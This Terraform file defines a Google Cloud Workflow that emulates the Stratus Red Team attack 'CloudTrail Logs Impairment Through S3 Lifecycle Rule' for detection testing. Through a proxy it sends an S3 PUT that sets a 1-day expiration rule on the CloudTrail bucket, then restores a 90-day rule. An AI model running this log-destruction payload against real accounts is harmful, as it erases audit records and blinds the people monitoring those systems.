data "google_service_account" "workflows-to-cloudrun-sa" {
  account_id   = "workflows-to-cloudrun-sa"

}

data "aws_region" "current" {}

resource "google_workflows_workflow" "workflow_to_invoke_cloudtrail_lifecycle_rule" {
  name            = "aws-cloudtrail-lifecycle-rule-srt"
  description     = "A workflow intended to match the functionality of the Status Red Team attack technique 'AWS CloudTrail Logs Impairment Through S3 Lifecycle Rule': https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/"
  service_account = data.google_service_account.workflows-to-cloudrun-sa.id
  project         = var.projectId
  source_contents = <<-EOF

######################################################################################
## Attack Description
######################################################################################

## Set a 1-day retention policy on the S3 bucket used by a CloudTrail Trail, using a S3 Lifecycle Rule.

#####################################################################################
## Input
######################################################################################
##### INPUT: {"user":"user01"}
##### INPUT: {"user":"user02"}


######################################################################################
## User Agent
######################################################################################
#### Workflow executes with the User-Agent string: "Derf-AWS-CloudTrail-Lifecycle-Rule-WORKFLOWEXECUTIONID"

######################################################################################
## Main Workflow Execution
######################################################################################
main:
  params: [args]
  steps:
    - assign:
        assign:
        - user: $${args.user}
        - projectID: $${sys.get_env("GOOGLE_CLOUD_PROJECT_ID")}  

    - getCloudRunURL:
        call: googleapis.run.v2.projects.locations.services.get
        args:
          name: '$${"projects/"+projectID+"/locations/us-central1/services/aws-proxy-app"}'
        result: appEndpoint 
    - putLifecyle:
        call: PutLifecyle
        args:
            user: $${user}
            appEndpoint: $${appEndpoint.uri}
        result: response
    - revertputLifecyle:
        call: RevertPutLifecyle
        args:
            user: $${user}
            appEndpoint: $${appEndpoint.uri}
        result: revertResponse
    - return:
        return: $${response}
        


######################################################################################
## Submodules | Sub-Workflows
######################################################################################
PutLifecyle:
  params: [user, appEndpoint]
  steps: 
    - PutLifecyle:
        try:
            steps:
                - callStep:
                    call: http.post
                    args:
                      url: '$${appEndpoint+"/submitRequest"}'
                      auth:
                          type: OIDC
                      headers:
                        Content-Type: application/json
                      body:
                          HOST: ${var.CloudTrailBucketName}.s3.${data.aws_region.current.name}.amazonaws.com
                          REGION: ${data.aws_region.current.name}
                          SERVICE:  s3 
                          ENDPOINT: "https://${var.CloudTrailBucketName}.s3.${data.aws_region.current.name}.amazonaws.com/?lifecycle"
                          BODY: '<LifecycleConfiguration xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Rule><Expiration><Days>1</Days></Expiration><ID>object-deletion</ID><Filter /><Status>Enabled</Status></Rule></LifecycleConfiguration>'
                          UA: '$${"Derf-AWS-CloudTrail-Lifecycle-Rule=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
                          USER: $${user}
                          VERB: PUT
                          MD5: true
                    result: response
                - checkNotOK:   
                    switch:
                      - condition: $${response.body.responseCode == 409}
                        raise: $${response}
        retry:
            predicate: $${custom_predicate}
            max_retries: 3
            backoff:
                initial_delay: 1
                max_delay: 30
                multiplier: 2

    - handle_result:
        switch:
          - condition: $${response.body.responseCode == 200}
            next: returnValidation
          - condition: $${response.body.responseCode == 403}
            next: error
          - condition: $${response.body.responseCode == 400}
            next: error
          - condition: $${response.body.responseCode == 409}
            next: conflict

    - returnValidation:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "SUCCESS - AWS Cloudtrail Impaired through the modification of S3 bucket Lifecycle rules"

    - error:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS Cloudtrail Impaired through the modification of S3 bucket Lifecycle rules" 

    - conflict:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS Cloudtrail Impaired through the modification of S3 bucket Lifecycle rules | there is some state conflict"             


RevertPutLifecyle:
  params: [user, appEndpoint]
  steps: 
    - PutLifecyle:
        try:
            steps:
                - callStep:
                    call: http.post
                    args:
                      url: '$${appEndpoint+"/submitRequest"}'
                      auth:
                          type: OIDC
                      headers:
                        Content-Type: application/json
                      body:
                          HOST: ${var.CloudTrailBucketName}.s3.${data.aws_region.current.name}.amazonaws.com
                          REGION: ${data.aws_region.current.name}
                          SERVICE:  s3 
                          ENDPOINT: "https://${var.CloudTrailBucketName}.s3.${data.aws_region.current.name}.amazonaws.com/?lifecycle"
                          BODY: '<LifecycleConfiguration xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Rule><Expiration><Days>90</Days></Expiration><ID>object-deletion</ID><Filter /><Status>Enabled</Status></Rule></LifecycleConfiguration>'
                          UA: '$${"Derf-AWS-CloudTrail-Lifecycle-Rule=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
                          VERB: PUT
                          MD5: true
                    result: response
                - checkNotOK:   
                    switch:
                      - condition: $${response.body.responseCode == 409}
                        raise: $${response}
        retry:
            predicate: $${custom_predicate}
            max_retries: 3
            backoff:
                initial_delay: 1
                max_delay: 30
                multiplier: 2

    - handle_result:
        switch:
          - condition: $${response.body.responseCode == 200}
            next: returnValidation
          - condition: $${response.body.responseCode == 403}
            next: error
          - condition: $${response.body.responseCode == 400}
            next: error
          - condition: $${response.body.responseCode == 409}
            next: conflict

    - returnValidation:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "SUCCESS - AWS Cloudtrail Impaired through the modification of S3 bucket Lifecycle rules"

    - error:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS Cloudtrail Impaired through the modification of S3 bucket Lifecycle rules" 

    - conflict:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS Cloudtrail Impaired through the modification of S3 bucket Lifecycle rules | there is some state conflict"  

custom_predicate:
  params: [response]
  steps:
    - what_to_repeat:
        switch:
          - condition: $${response.body.responseCode == 400}
            return: true
          - condition: $${response.body.responseCode == 409}
            return: true
          - condition: $${response.body.responseCode == 500}
            return: true
    - otherwise:
        return: false

  EOF

}